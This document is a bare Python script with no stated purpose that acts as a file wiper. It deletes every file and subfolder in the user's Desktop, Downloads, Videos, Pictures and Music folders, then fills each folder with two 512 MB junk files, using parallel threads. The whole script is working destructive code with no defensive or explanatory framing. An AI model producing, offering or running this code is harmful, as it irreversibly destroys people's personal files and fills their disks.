
import os
import shutil
import concurrent.futures

from pathlib import Path

# Get user folders
from os.path import expanduser

USER = expanduser("~")
FOLDERS = [
	os.path.join(USER, "Desktop"),
	os.path.join(USER, "Downloads"),
	os.path.join(USER, "Videos"),
	os.path.join(USER, "Pictures"),
	os.path.join(USER, "Music"),
]

FILE_SIZE = 512 * 1024 * 1024  # 0.5 GB
FILE_COUNT = 2
CHUNK = b"A" * (1024 * 1024)  # 1 MB chunk

def clear_folder(folder):
	for item in Path(folder).iterdir():
		try:
			if item.is_file() or item.is_symlink():
				item.unlink()
			elif item.is_dir():
				shutil.rmtree(item)
		except Exception as e:
			print(f"Failed to delete {item}: {e}")

def create_big_file(folder, idx):
	filename = os.path.join(folder, f"bigfile_{idx+1}.txt")
	with open(filename, "wb") as f:
		written = 0
		while written < FILE_SIZE:
			to_write = min(FILE_SIZE - written, len(CHUNK))
			f.write(CHUNK[:to_write])
			written += to_write

def process_folder(folder):
	if not os.path.exists(folder):
		os.makedirs(folder)
	clear_folder(folder)
	for i in range(FILE_COUNT):
		create_big_file(folder, i)

def main():
	with concurrent.futures.ThreadPoolExecutor() as executor:
		executor.map(process_folder, FOLDERS)

if __name__ == "__main__":
	main()
